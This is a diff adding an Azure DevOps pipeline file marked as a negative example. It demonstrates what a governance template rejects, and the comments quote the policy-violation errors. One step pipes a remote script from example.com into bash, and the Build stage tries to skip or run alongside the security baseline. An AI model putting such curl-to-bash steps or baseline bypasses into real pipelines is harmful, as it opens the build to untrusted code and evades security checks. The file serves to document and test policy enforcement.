@@ -1,0 +1,38 @@
+# NEGATIVE EXAMPLE - this pipeline is rejected at compile time.
+# It shows what the governance template blocks. Queueing it fails with:
+#   Unexpected value 'POLICY VIOLATION - inline script steps (script, bash,
+#   powershell, pwsh) are not allowed; ...'
+# and, for the second stage:
+#   Unexpected value 'POLICY VIOLATION - raw deployment jobs are not allowed; ...'
+
+trigger: none
+
+resources:
+  repositories:
+    - repository: templates
+      type: github
+      name: rsk071216-stack/azure-devops-pipeline-templates
+      ref: refs/tags/v1.0.0
+      endpoint: github-platform-templates
+
+extends:
+  template: templates/governance/secure-pipeline.yml@templates
+  parameters:
+    stages:
+      - stage: Build
+        dependsOn: []          # attempt to run in parallel with the baseline -> SecurityBaseline is re-added
+        condition: always()    # attempt to ignore a failed baseline -> wrapped in succeeded('SecurityBaseline')
+        jobs:
+          - job: Sneaky
+            steps:
+              - checkout: self
+              - script: curl https://example.com/install.sh | bash    # rejected: inline script
+      - stage: Release
+        jobs:
+          - deployment: HandRolled                                  # rejected: raw deployment job
+            environment: shop-prod
+            strategy:
+              runOnce:
+                deploy:
+                  steps:
+                    - checkout: self
